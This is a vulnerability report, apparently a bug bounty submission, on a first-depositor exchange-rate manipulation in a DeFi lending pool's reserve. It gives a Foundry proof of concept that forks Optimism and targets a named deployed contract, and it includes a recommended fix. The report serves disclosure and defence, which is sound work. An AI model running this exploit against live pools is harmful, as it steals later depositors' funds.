# Malicious first depositor of new reserve can steal late depositor' fund by manipulating exchange rate.

## Bug Description
Here's attack scenario when a new reserve gets initialized. 

1. A hacker deposits 1 wei of underlying token to become first depositor of new reserve.
2. The hacker send large underlying token to `eToken` address to manipulate exchange rate to exceptionally high.
3. Subsequent depositors will get nothing or less eToken in return because of inflated exchanged rate.
4. The hacker can redeem all reserve balance including subsequent depositor's fund.

He can repeat it any number of times whenever new depositor comes.

## Vulnerability Details
To manipulate exchange rate, you have to manipulate available liquidity which is underlying token balance of eToken address.
```
  function availableLiquidity(
        DataTypes.ReserveData storage reserve
    ) internal view returns (uint256 liquidity) {
        liquidity = IERC20(reserve.underlyingTokenAddress).balanceOf(
            reserve.eTokenAddress
        );
    }
```

Here's the logic for exchange rate and eToken amount when depositing.

https://optimistic.etherscan.io/address/0xbb505c54d71e9e599cb8435b4f0ceec05fc71cbd
```solidity
    function reserveToETokenExchangeRate(
        DataTypes.ReserveData storage reserve
    ) internal view returns (uint256) {
        (uint256 totalLiquidity, ) = totalLiquidityAndBorrows(reserve);
        uint256 totalETokens = IERC20(reserve.eTokenAddress).totalSupply();

        if (totalETokens == 0 || totalLiquidity == 0) {
            return Precision.FACTOR1E18;
        }
        return totalETokens.mul(Precision.FACTOR1E18).div(totalLiquidity);
    }
```

```
  function _deposit(
        uint256 reserveId,
        uint256 amount,
        address onBehalfOf
    ) internal returns (uint256 eTokenAmount) {
        ...

        uint256 exchangeRate = reserve.reserveToETokenExchangeRate();
        ...

        // Mint eTokens for the user
        eTokenAmount = amount.mul(exchangeRate).div(Precision.FACTOR1E18);

        IExtraInterestBearingToken(reserve.eTokenAddress).mint(
            onBehalfOf,
            eTokenAmount
        );
        ... 
    }
```

## Impact

First depositor can steal future users' deposits while the victims will get lose all of his deposit.

## Recommendation
When initializing reserve, fixed amount of eToken should be minted to address(0).

By minting fixed amount of `eToken`, it will become economically difficult to manipulate exchange rate for hacker.

```solidity
  function initReserve(
        DataTypes.ReserveData storage reserveData,
        address underlyingTokenAddress,
        address eTokenAddress,
        uint256 reserveCapacity,
        uint256 id
    ) internal {
        reserveData.underlyingTokenAddress = underlyingTokenAddress;
        reserveData.eTokenAddress = eTokenAddress;
        reserveData.reserveCapacity = reserveCapacity;
        reserveData.id = id;

        reserveData.lastUpdateTimestamp = uint128(block.timestamp);
        reserveData.borrowingIndex = Precision.FACTOR1E18;

        reserveData.reserveFeeRate = 1500; // 15.00%

+       IERC20(eTokenAddress).mint(addresss(0), 1000);

        // set initial borrowing rate
        // (0%, 0%) -> (80%, 20%) -> (90%, 50%) -> (100%, 150%)
        setBorrowingRateConfig(reserveData, 8000, 2000, 9000, 5000, 15000);
    }
```

## Proof of Concept
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";

interface ILendingPool {
  function initReserve(address asset) external;

  function nextReserveId() external returns (uint256);

  function owner() external returns (address);

  function deposit(
      uint256 reserveId,
      uint256 amount,
      address onBehalfOf,
      uint16 referralCode
  ) external payable returns (uint256);

    function redeem(
        uint256 reserveId,
        uint256 eTokenAmount,
        address to,
        bool receiveNativeETH
  ) external payable returns (uint256);

    function getETokenAddress(uint256 reserveId) external view returns (address);

    function exchangeRateOfReserve(uint256 reserveId) external view returns (uint256);

}
interface   IERC20 {
  function name() external view returns (string memory);
  function decimals() external view returns (uint8);
  function balanceOf(address owner) external view returns (uint256);
  function totalSupply() external view returns (uint256);

  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
}

contract ContractTest is Test {
    address       hacker = 0xf8ea83bEC8CcBC3d5564E23FE71d15f1b1e7f2b0;
    address       victim = 0x1705fA8e57C4320048E3ed8F8B7523C340f2AA47;
    ILendingPool  lendingPool = ILendingPool(0xBB505c54D71E9e599cB8435b4F0cEEc05fC71cbD);
    IERC20        underlying = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85); // usdc

  function setUp() public {
    vm.createSelectFork("optimism"); 

    vm.label(address(lendingPool), "lendingPool");
    vm.label(address(underlying), "underlying");
    vm.label(address(hacker), "hacker");
    vm.label(address(victim), "victim");
  }

  function testExtra() public {
    vm.startPrank(lendingPool.owner());
    lendingPool.initReserve(address(underlying));

    uint256 reserveId = lendingPool.nextReserveId() - 1;
    IERC20  eToken = IERC20(lendingPool.getETokenAddress(reserveId));
    uint256 prevBalance = underlying.balanceOf(hacker);


    // Step 1
    console.log("Step 1 - Becoming first depostor and manipulating exchange rate");
    vm.startPrank(hacker);
    underlying.approve(address(lendingPool), type(uint256).max);
    eToken.approve(address(lendingPool), type(uint256).max);
    lendingPool.deposit(reserveId, 1, hacker, 0);
    emit log_named_decimal_uint("Exchange rate before manipulation", lendingPool.exchangeRateOfReserve(reserveId), 18);
    underlying.transfer(address(eToken), underlying.balanceOf(hacker));
    emit log_named_decimal_uint("Exchange rate after manipulation", lendingPool.exchangeRateOfReserve(reserveId), 18);
    emit log_named_decimal_uint("eToken totalSupply", eToken.totalSupply( ), 0);
    emit log_named_decimal_uint("Hackers's eToken balance", eToken.balanceOf(hacker), 0);
    emit log_named_decimal_uint("Hacker's underlying balance", underlying.balanceOf(hacker), 6);

    // Step 2
    console.log("");
    console.log("Step 2 - Stealing victim's deposit");
    vm.startPrank(victim);
    underlying.approve(address(lendingPool), type(uint256).max);
    eToken.approve(address(lendingPool), type(uint256).max);
    lendingPool.deposit(reserveId, 5000_000_000, victim, 0);
    emit log_named_decimal_uint("Victim's eToken balance", eToken.balanceOf(victim), 0);

    // Step 3
    console.log("");
    console.log("Step 3 - Withdrawing profit");
    vm.startPrank(hacker);
    lendingPool.redeem(reserveId, eToken.balanceOf(hacker), hacker, false);
    emit log_named_decimal_uint("Hacker's profit", underlying.balanceOf(hacker) - prevBalance, 6);
  }
}
```

###Output
```
Running 1 test for test/ExtraFinance_test.sol:ContractTest
[PASS] testExtra() (gas: 3289973)
Logs:
  Step 1 - Becoming first depostor and manipulating exchange rate
  Exchange rate before manipulation: 1.000000000000000000
  Exchange rate after manipulation: 10000000000.000000000000000000
  eToken totalSupply: 1.0
  Hackers's eToken balance: 1.0
  Hacker's underlying balance: 0.000000

  Step 2 - Stealing victim's deposit
  Victim's eToken balance: 0.0

  Step 3 - Withdrawing profit
  Hacker's profit: 5000.000000
```